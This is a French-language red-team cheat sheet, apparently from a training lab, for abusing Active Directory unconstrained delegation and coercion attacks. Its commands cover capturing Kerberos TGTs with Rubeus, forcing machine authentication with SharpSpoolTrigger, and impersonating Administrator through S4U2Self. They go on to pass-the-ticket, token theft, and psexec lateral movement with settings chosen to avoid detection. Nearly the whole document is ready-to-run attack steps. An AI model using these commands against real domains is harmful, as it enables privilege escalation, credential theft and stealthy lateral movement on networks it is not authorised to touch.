
- [[#Unconstrained Delegation]]
- [[#Attaque par Coercition / Computer TakeOver]]


# Unconstrained Delegation

> [!Warning]
> Necessite les priv SYSTEM


1. Identifier les délégations non contraintes

```
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

2. Depuis la machine en question, lancer rubeus en mode monitor afin de capturer les TGT

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
```

3. Stopper rubeus

```
jobs
jobkill <jid>
```

4. Faire un Pass The Ticket avec le ticket capturé

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:[TICKET]
```

5. Voler le token du process et l'ajouter au store

```
token-store steal <pid>
```

6. Utiliser le token (ne pas faire attention au user impersonné indiqué, il s'agit du username qui à lancé le process)

```
token-store use <id>
```

7. Vérifier que le ticket est présent en cache

```
run klist
```

8. Vérifier l'accès à la ressource distante

```
ls \\lon-dc-1\c$
```

Arreter l'impersonation

```
rev2self
```

Arreter le processus lancé

```
kill <pid>
```



---
# Attaque par Coercition / Computer TakeOver

Permet de forcer une machine cible à se connecter à notre machine.

[SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) -> Collection des attaques de coercition dont SpoolSample & PetitPotam


1. Identifier les délégations non contraintes

```
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

2. Depuis la machine en question, lancer rubeus en mode monitor afin de capturer les TGT

> [!Warning]
> Doit être lancé depuis une session en integrité haute (SYSTEM)

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
```

2. Utiliser la collection [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers)pour faire une attaque de coercition et capturer le TGT d'une machine vulnérable (MS-RPRN | MS-EFSRPC exposé).

> [!Warning]
> Doit être lancé depuis une session en integrité medium (user standard).
> Relancer plusieurs fois.

```
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe <machine_cible> <machine_ayant_delegation_non_contrainte>
```

3. Stopper rubeus

```
jobs
jobkill <jid>
```

4. Faire un S4U2Self avec le TGT afin d'usurper n'importe quel user et obtenir un TGS (argument /self)

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:<tgt> /nowrap
```

4. Pass The Ticket dans un nouveau process

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<tgs>
```

5. Voler le token du process et l'ajouter au store

```
token-store steal <pid>
```

6. Utiliser le token (ne pas faire attention au user impersonné indiqué, il s'agit du username qui à lancé le process)

```
token-store use <id>
```

7. Vérifier que le TGS est présent en cache

```
run klist
```

8. Possible d'énumérer le partage ensuite ou bien latéraliser avec psexec

```
ls \\lon-fs-1\c$
```

Définir le processus à injecter et le nom du service pour réduire la surface de detection :

```
ak-settings service updater
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

```
jump psexec64 lon-fs-1 smb
```

